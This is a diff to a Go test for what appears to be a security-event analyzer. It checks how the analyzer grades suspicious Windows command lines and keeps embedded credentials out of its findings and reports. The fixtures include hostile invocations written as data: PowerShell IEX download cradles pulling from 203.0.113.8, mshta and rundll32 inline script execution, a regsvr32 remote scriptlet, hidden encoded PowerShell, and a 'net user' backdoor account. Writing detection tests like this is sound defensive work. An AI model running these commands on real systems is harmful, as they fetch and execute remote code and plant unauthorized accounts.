@@ -34,6 +34,14 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 		{ID: "token-hash", EventType: model.EventPowerShellScript, CommandLine: `Write-Output foo#bar; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a'); net user alice DummySecret42 /add`},
 		{ID: "standalone-comment", EventType: model.EventPowerShellScript, CommandLine: `Write-Output foo #bar; IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')`},
 		{ID: "install-data", EventType: model.EventScheduledTaskCreate, ProcessName: "regsvr32.exe", CommandLine: `regsvr32.exe /i:"https://203.0.113.8/data" C:\Tools\audit.dll`},
+		{ID: "inline-js", EventType: model.EventScheduledTaskCreate, ProcessName: "mshta.exe", CommandLine: `mshta.exe javascript:a=GetObject("script:https://203.0.113.8/a")`},
+		{ID: "inline-vbs", EventType: model.EventScheduledTaskCreate, ProcessName: "mshta.exe", CommandLine: `mshta.exe vbscript:Execute("x")(window.close)`},
+		{ID: "inline-dll", EventType: model.EventScheduledTaskCreate, ProcessName: "rundll32.exe", CommandLine: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write()`},
+		{ID: "cmd-script", EventType: model.EventScheduledTaskCreate, ProcessName: "cmd.exe", CommandLine: `cmd.exe /c C:\Users\alice\AppData\Local\Temp\a.bat`},
+		{ID: "ps-script", EventType: model.EventScheduledTaskCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -c "& 'C:\Users\alice\AppData\Local\Temp\a.ps1'"`},
+		{ID: "nested-host", EventType: model.EventPowerShellScript, CommandLine: `powershell.exe -w hidden -enc AAAA`},
+		{ID: "unsupported-host", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -unknown -enc AAAA`},
+		{ID: "url-userinfo", EventType: model.EventPowerShellScript, CommandLine: `IEX (iwr 'https://alice:Dummy%40Secret%3A42@host01/a?q=x')`},
 		{ID: "local-data", EventType: model.EventScheduledTaskCreate, ProcessName: "wscript.exe", CommandLine: `wscript.exe C:\Tools\audit.vbs C:\Temp\data.vbs`},
 	}
 	col := model.Collection{ID: "controls-collection", CaseID: c.ID, SourceType: model.SourceTypeLegacy, IngestionStatus: model.CollectionStatusPending}
@@ -72,8 +80,10 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 			t.Fatal("finding secret leak")
 		}
 	}
-	if len(selected) != 12 {
-		t.Fatalf("selected %d leads want 12: %+v", len(selected), selected)
+	// Every fixture except positively bounded literal/comment data remains a
+	// lead under the authorized conservative policy; no raw events disappear.
+	if len(selected) != len(events)-2 {
+		t.Fatalf("selected %d leads want %d", len(selected), len(events)-2)
 	}
 	for _, id := range []string{"hostile-shell", "hostile-task", "hostile-script", "host-options-task", "escaped-script", "encoded-order-shell", "independent-dll", "quoted-install", "token-hash"} {
 		if selected[id].Severity != model.SeverityHigh {
@@ -86,13 +96,36 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 	if f := selected["local-dll"]; f.Severity != model.SeverityMedium || f.Confidence != model.ConfidenceLow {
 		t.Fatal("independent local DLL lost medium/low lead")
 	}
-	for _, id := range []string{"remote-data-task", "unc-data-task", "standalone-comment", "install-data", "local-data"} {
+	for _, id := range []string{"standalone-comment", "literal-search"} {
 		if _, ok := selected[id]; ok {
 			t.Fatalf("data/comment selected: %s", id)
 		}
 	}
 	if f := selected["writable-script-task"]; f.Severity != model.SeverityMedium || f.Confidence != model.ConfidenceLow {
 		t.Fatal("writable script target lost medium/low lead")
+	}
+	for _, id := range []string{"routine-shell", "routine-task", "remote-data-task", "unc-data-task", "install-data", "local-data", "unsupported-host"} {
+		if f := selected[id]; f.Severity != "low" || f.Confidence != "low" {
+			t.Fatalf("context/unknown form escalated: %s", id)
+		}
+	}
+	for _, id := range []string{"inline-js", "inline-vbs", "inline-dll"} {
+		if f := selected[id]; f.Severity != "medium" || f.Confidence != "medium" || !strings.Contains(f.Description, "inline active-code") {
+			t.Fatalf("inline supported regression: %s", id)
+		}
+	}
+	for _, id := range []string{"cmd-script", "ps-script"} {
+		if f := selected[id]; f.Severity != "medium" || f.Confidence != "low" {
+			t.Fatalf("command target regression: %s", id)
+		}
+	}
+	if selected["nested-host"].Severity != "high" {
+		t.Fatal("nested host lost")
+	}
+	for _, f := range fs {
+		if strings.Contains(f.Description, "Dummy%40Secret%3A42") {
+			t.Fatal("URL userinfo leaked in findings")
+		}
 	}
 	inv := getInvestigations(t, mux, c.ID)
 	if len(inv) == 0 {
@@ -111,11 +144,20 @@ func TestAnalyze_InvocationNoiseControlsAndReport(t *testing.T) {
 			t.Fatalf("report missing %q", s)
 		}
 	}
-	if strings.Contains(html, "DummySecret42") {
+	if strings.Contains(html, "DummySecret42") || strings.Contains(html, "Dummy%40Secret%3A42") {
 		t.Fatal("report secret leak")
 	}
 	stored, err := svc.store.ListEvents(c.ID)
 	if err != nil || len(stored) != len(events) {
 		t.Fatalf("raw events changed: %d %v", len(stored), err)
+	}
+	original := false
+	for _, e := range stored {
+		if e.ID == "url-userinfo" {
+			original = strings.Contains(e.CommandLine, "Dummy%40Secret%3A42")
+		}
+	}
+	if !original {
+		t.Fatal("stored original command was destructively redacted")
 	}
 }
